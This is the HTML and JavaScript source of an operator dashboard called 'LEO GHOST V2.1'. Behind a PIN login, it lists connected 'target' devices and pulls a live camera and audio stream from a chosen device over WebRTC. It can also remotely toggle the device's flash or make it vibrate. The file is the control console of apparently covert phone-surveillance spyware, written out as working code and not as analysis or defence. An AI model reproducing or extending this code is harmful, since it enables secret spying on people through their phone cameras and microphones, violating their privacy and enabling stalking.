<!DOCTYPE html>
<html lang="en">
<head>
    <title>LEO GHOST V2.1 - ADMIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { box-sizing: border-box; transition: 0.3s; }
        body { background: #050a14; color: #00d4ff; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; }
        #login-screen { position: fixed; inset: 0; background: #050a14; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
        .login-box { background: #0a192f; padding: 30px; border: 2px solid #00d4ff; border-radius: 15px; box-shadow: 0 0 20px #00d4ff55; text-align: center; }
        input { background: #112240; border: 1px solid #00d4ff; color: white; padding: 12px; border-radius: 5px; width: 250px; outline: none; margin-bottom: 15px; }
        button { background: #00d4ff; color: #050a14; border: none; padding: 12px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; }
        #dashboard { display: grid; grid-template-columns: 280px 1fr; height: 100vh; visibility: hidden; }
        .sidebar { background: #0a192f; border-right: 1px solid #00d4ff33; padding: 20px; overflow-y: auto; }
        .user-item { background: #112240; padding: 15px; margin-bottom: 10px; border-radius: 8px; cursor: pointer; border: 1px solid transparent; }
        .user-item.active { background: #00d4ff; color: #050a14; font-weight: bold; }
        .main-view { padding: 20px; display: flex; flex-direction: column; align-items: center; }
        .video-container { width: 100%; max-width: 900px; height: 70vh; background: #000; border: 2px solid #00d4ff; border-radius: 10px; overflow: hidden; position: relative; }
        video { width: 100%; height: 100%; object-fit: contain; } /* FIX: Poora chehra dikhega */
        .controls { margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; }
        .btn-cmd { background: #112240; border: 1px solid #00d4ff; color: #00d4ff; padding: 8px 15px; border-radius: 5px; cursor: pointer; }
        #audio-notice { background: #ffcc00; color: #000; padding: 5px; font-size: 0.8rem; border-radius: 5px; margin-bottom: 5px; display: none; }
    </style>
</head>
<body>
    <div id="login-screen">
        <div class="login-box">
            <h2>LEO GHOST V2.1</h2>
            <input type="password" id="pass" placeholder="Enter Admin Pin">
            <br>
            <button onclick="login()">AUTHORIZE</button>
        </div>
    </div>

    <div id="dashboard">
        <div class="sidebar">
            <h2 style="font-size: 1rem;">ONLINE DEVICES</h2>
            <div id="user-list"></div>
        </div>

        <div class="main-view">
            <div id="audio-notice">‚ö†Ô∏è Browser blocked audio. Click UNMUTE to hear sound.</div>
            <div class="video-container">
                <video id="remoteVideo" autoplay playsinline></video>
            </div>

            <div class="controls">
                <button class="btn-cmd" style="background: #28a745; color: #fff;" onclick="enableAudio()">üîä UNMUTE AUDIO</button>
                <button class="btn-cmd" onclick="sendCommand('flash')">Toggle Flash</button>
                <button class="btn-cmd" onclick="sendCommand('vibrate')">Vibrate</button>
                <button class="btn-cmd" onclick="location.reload()">Refresh</button>
            </div>
        </div>
    </div>
    <script>
        const socket = io();
        let currentTargetId = null;
        let peerConnection;
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        function login() { socket.emit('admin-join', document.getElementById('pass').value); }
        socket.on('admin-status', (res) => {
            if(res.success) {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('dashboard').style.visibility = 'visible';
            } else { alert("Wrong Pin!"); }
        });

        socket.on('update-targets', (list) => {
            const listDiv = document.getElementById('user-list');
            listDiv.innerHTML = "";
            list.forEach((id) => {
                const div = document.createElement('div');
                div.className = `user-item ${currentTargetId === id ? 'active' : ''}`;
                div.innerText = `ID: ${id.substring(0,6)}`;
                div.onclick = () => selectTarget(id);
                listDiv.appendChild(div);
            });
        });

        function enableAudio() {
            const video = document.getElementById('remoteVideo');
            video.muted = false;
            video.play();
            document.getElementById('audio-notice').style.display = 'none';
        }
        async function selectTarget(id) {
            currentTargetId = id;
            if(peerConnection) peerConnection.close();
            peerConnection = new RTCPeerConnection(config);
            peerConnection.onicecandidate = (e) => {
                if(e.candidate) socket.emit('signal', { to: currentTargetId, signal: { candidate: e.candidate } });
            };
            peerConnection.ontrack = (e) => {
                document.getElementById('remoteVideo').srcObject = e.streams[0];
                document.getElementById('audio-notice').style.display = 'block';
            };
            socket.emit('command', { targetId: currentTargetId, cmd: 'start-stream' });
        }

        socket.on('signal', async (data) => {
            if(data.from !== currentTargetId) return;
            if(data.signal.sdp) {
                await peerConnection.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
                if(data.signal.sdp.type === 'offer') {
                    const ans = await peerConnection.createAnswer();
                    await peerConnection.setLocalDescription(ans);
                    socket.emit('signal', { to: data.from, signal: { sdp: ans } });
                }
            } else if(data.signal.candidate) {
                await peerConnection.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
            }
        });

        function sendCommand(cmd) { socket.emit('command', { targetId: currentTargetId, cmd: cmd }); }
    </script>
</body>
</html>
